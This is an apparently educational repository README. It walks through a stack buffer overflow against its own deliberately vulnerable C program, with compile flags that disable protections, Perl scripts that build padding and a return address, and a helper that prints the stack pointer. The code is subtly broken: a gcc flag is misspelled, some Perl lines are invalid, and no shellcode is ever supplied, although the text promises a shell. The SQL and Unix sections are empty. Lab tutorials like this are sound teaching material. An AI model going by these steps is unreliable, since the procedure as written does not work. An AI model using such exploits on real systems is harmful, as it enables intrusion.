## Better be Safe than Sorry
#### A continuing updating repo of computer security examples and exploits.

1. [General Unix Vulnerabilities](#Unix_Vulnerabilities)

2. [SQL Injections](#SQL_Injections)

3. [Buffer Overflows](#Buffer_Overflows)

<a name="Unix_Vulnerabilities"></a>
#### General Unix Vulnerabilites

<a name="SQL_Injections"></a>
#### SQL Injections

<a name="Buffer_Overflows"></a>
#### Buffer Overflows

Buffer overflow happens when when a program writing data to a buffer, exceeds the bounds of the buffer, causing the excess data to overflow into adjacent memory. 

From the example vulnerable code [here](https://github.com/amandazhuyilan/Better-be-Safe-than-Sorry/blob/master/buffer_overflow.c), the buffer overflow can happen at the ```strcat``` line, where the boundary of the concatenated string appended into the buffer is not checked, causing an overflowed buffer.

Steps to exploit this vulnerability and invoking a shell is as follows:

1. Complile the buffer_overflow.c with the following command, turning off the stack protection system and enabling debugging:

```gcc buffer_overflow.c -g -fno_stack_protector -o buffer_overflow```

2. Figure out how many pops it takes for us to get to the end of the buffer, usually the number is a little bigger than the buffer size (500 for this example). In this example we are going to use a perl script ```exploit.pl``` to help us generate the needed 500ish characters:

```
#!/usr/bin/perl

printf "A" x500;
```
```chmod +x exploit.pl``` to make sure it has the necessary permissions, then feed it into the ```buffer_overflow``` executable that we just compiled in gdb:
 
 ```$gdb(buffer_overflow)```
 ```$(gdb)run `exploit.pl` ```
 
Modify the number of "A"s in the perl script so that the buffer is overflowed successfully it would show up as a segmentation fault at 0x41414141. 

3. Add a ```stack.c``` that looks like this:
```
#include <stdio.h>

unsigned long get_sp()
{
	__asm__("mov %esp, %eax");
}

main()
{
	printf("SP is: %lx\n\n", get_sp());
}
```
Compile it with ```gcc -m32 -o stack```. This ```stack``` execuatble will print the current stack pointer that we will use later. Note that the stack pointer address doesn't change frequently, but it might be different if you run ```stack``` many commands away.

4. Modify ```exploit.pl``` to look like the following (also avaliable [here](https://github.com/amandazhuyilan/Better-be-Safe-than-Sorry/blob/master/buffer_overflow-exploit.pl)):
```
#!/usr/bin/perl

$RETURN_ADDRESS=0x'the sp address resulted from stack';

$RETURN_ADDRESS=$RETURN_ADDRESS - $ARGV[0];

$address = pack("l",$RETURN_ADDRESS);  //Perl has its own built in function to modify the address to little endian

printf "A" x517$address;   //517 is what I got. Put in your own number
```

Make sure you ```chmod +x exploit.pl``` after you finished modifiying it.

5. You're almost all good to go! Type in ```buffer_overflow `exploit.pl` ```. It'll be highly likely that you will see ```segmentation fault```, this is where ```$RETURN_ADDRESS=$RETURN_ADDRESS - $ARGV[0];``` in the ```exploit.pl``` will help modify the memory address a bit. Try ```buffer_overflow `exploit.pl -1000` ```, ```buffer_overflow `exploit.pl 1000` ``` etc. (Mine worked at ```buffer_overflow `exploit.pl -2000` ```).

If all the steps are performed in order, and right, a shell should be exploited :D





